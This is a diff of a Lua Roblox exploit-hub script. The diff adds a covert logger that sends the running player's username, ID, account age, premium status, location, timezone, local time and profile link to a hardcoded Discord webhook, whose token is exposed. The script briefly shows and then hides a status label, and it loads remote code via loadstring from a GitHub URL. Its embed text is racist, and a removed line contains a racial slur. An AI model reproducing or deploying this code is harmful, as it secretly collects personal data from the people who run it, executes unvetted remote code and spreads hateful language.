@@ -1,32 +1,192 @@
-local url =
-   "https://discord.com/api/webhooks/1112487123740786790/TVUymR6dD5W911jHju6z-yen5zPs08BbFBQA5t8es5eRTudH_khupPDlIEuhyFsuM0pL"
-local data = {
-   ["content"] = "",
-   ["embeds"] = {
-       {
-           ["title"] = "**Username: " .. game.Players.LocalPlayer.Name.." Executed Your Script in ".. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."!**",
-           ["description"] = "This Black one is up to no good",
-           ["type"] = "Rich",
-           ["color"] = tonumber(4334245),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
+local url = "https://discord.com/api/webhooks/1112487123740786790/TVUymR6dD5W911jHju6z-yen5zPs08BbFBQA5t8es5eRTudH_khupPDlIEuhyFsuM0pL"
 
-local headers = {
-   ["content-type"] = "application/json"
+local customContent = ""
+
+local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+local gameName = gameInfo.Name
+local gameId = game.PlaceId
+local gameLink = "https://www.roblox.com/games/" .. gameId .. "/Game-Name"
+local playerId = game.Players.LocalPlayer.UserId
+local avatarImage = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userid=" .. playerId
+
+local startTime = os.time()
+
+local function formatTime(seconds)
+    local minutes = math.floor(seconds / 60)
+    local hours = math.floor(minutes / 60)
+    local days = math.floor(hours / 24)
+    minutes = minutes % 60
+    seconds = seconds % 60
+    return string.format("%d days, %02d:%02d:%02d", days, hours, minutes, seconds)
+end
+
+local function getAccountAge(player)
+    local joinDate = player.AccountAge
+    local accountAgeFormatted = formatTime(joinDate)
+    return accountAgeFormatted
+end
+
+local function hasPremium(player)
+    return player.MembershipType ~= Enum.MembershipType.None
+end
+
+local function getPlayerCount()
+    local players = game.Players:GetPlayers()
+    return #players
+end
+
+local function getPlayerState(player)
+    local success, result = pcall(function()
+        return game:GetService("LocalizationService"):GetPlayerLocation(player)
+    end)
+    if success then
+        return result
+    else
+        return "Unknown"
+    end
+end
+
+local function updatePlaytime()
+    while true do
+        local currentTime = os.time()
+        local playtimeSeconds = currentTime - startTime
+        local playtimeFormatted = formatTime(playtimeSeconds)
+        data.embeds[1].fields[2].value = playtimeFormatted
+        wait(1) -- Update every second
+    end
+end
+
+local data = {
+    content = customContent,
+    embeds = {
+        {
+            title = "**Username: " .. game.Players.LocalPlayer.Name .. "  " .. gameName .. "!**",
+            description = "This Black one is up to no good",
+            type = "rich",
+            color = tonumber(4334245),
+            fields = {
+                { name = "Player Count", value = "Calculating...", inline = true },
+                { name = "Playtime", value = "Calculating...", inline = true },
+                { name = "Account Age", value = "Calculating...", inline = true },
+                { name = "Premium Status", value = "Calculating...", inline = true },
+                { name = "Timezone", value = "Calculating...", inline = true },
+                { name = "Local Time", value = "Calculating...", inline = true },
+                { name = "Profile Link", value = "Calculating...", inline = true },
+                { name = "State", value = "Calculating...", inline = true }
+            },
+            image = {
+                url = avatarImage
+            }
+        },
+        {
+            title = "Game Link",
+            description = "[" .. gameName .. "](" .. gameLink .. ")",
+            type = "rich",
+            color = tonumber(16711680),
+        }
+    }
 }
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+
+local httpService = game:GetService("HttpService")
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+
+local function sendRequest()
+    local player = game.Players.LocalPlayer
+
+    data.embeds[1].fields[3].value = getAccountAge(player)
+    data.embeds[1].fields[4].value = hasPremium(player) and "Premium" or "Not Premium"
+    data.embeds[1].fields[1].value = getPlayerCount()
+    data.embeds[1].fields[5].value = os.date("%Z") -- Current Timezone
+    data.embeds[1].fields[6].value = os.date("%c") -- Local Time
+    data.embeds[1].fields[7].value = "https://www.roblox.com/users/" .. playerId .. "/profile/#!/creations" -- Profile Link
+    data.embeds[1].fields[8].value = getPlayerState(player)
+
+    local encodedData = httpService:JSONEncode(data)
+    local httpRequest = {
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = encodedData
+    }
+    local request = http_request or request or HttpPost or syn.request
+    request(httpRequest)
+end
+
+local gui = Instance.new("ScreenGui")
+gui.Parent = game.Players.LocalPlayer.PlayerGui
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0, 200, 0, 50)
+statusLabel.Position = UDim2.new(0.5, -100, 0.5, -25)
+statusLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+statusLabel.Text = "Sending request..."
+statusLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+statusLabel.Font = Enum.Font.SourceSansBold
+statusLabel.TextSize = 18
+statusLabel.BackgroundTransparency = 1
+statusLabel.Parent = gui
+
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.new(0, 200, 0, 50)
+copyButton.Position = UDim2.new(0, 10, 1, -60)
+copyButton.AnchorPoint = Vector2.new(0, 1)
+copyButton.Text = "Join the discord"
+copyButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+copyButton.Font = Enum.Font.SourceSansBold
+copyButton.TextSize = 18
+copyButton.BackgroundTransparency = 0.5
+copyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+copyButton.Parent = gui
+
+wait(0.2) -- Adjusted delay to make it disappear instantly
+
+statusLabel.Visible = false
+
+wait(2)
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Text = "Player Count: " .. getPlayerCount()
+label.TextColor3 = Color3.fromRGB(0, 0, 0)
+label.Font = Enum.Font.SourceSansBold
+label.TextSize = 18
+label.BackgroundTransparency = 1
+label.Parent = gui
+
+local function centerStatusLabel()
+    statusLabel.Position = UDim2.new(0.5, -100, 0.5, -25)
+    statusLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+end
+
+centerStatusLabel()
+
+wait(0)
+
+statusLabel.Visible = false
+
+copyButton.MouseButton1Click:Connect(function()
+    game:GetService("GuiService"):SetClipboard(gameLink)
+    copyButton.Visible = false -- Hide the button after copying
+end)
+
+spawn(sendRequest)
+
+wait(1) -- Added delay to make other messages disappear after 1 second
+
+label:Remove()
+
+wait(5) -- Changed to 4 seconds to compensate for the previous 1-second delay
+
+copyButton.Visible = false -- Hide the button after 5 seconds
+
+-- Additional code here
+
 
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
-local win = DiscordLib:Window("NiggerHub beta.v1")
+local win = DiscordLib:Window("Rudolpj.v1")
 
 local serv = win:Server("Main", "http://www.roblox.com/asset/?id=4483345998")
 
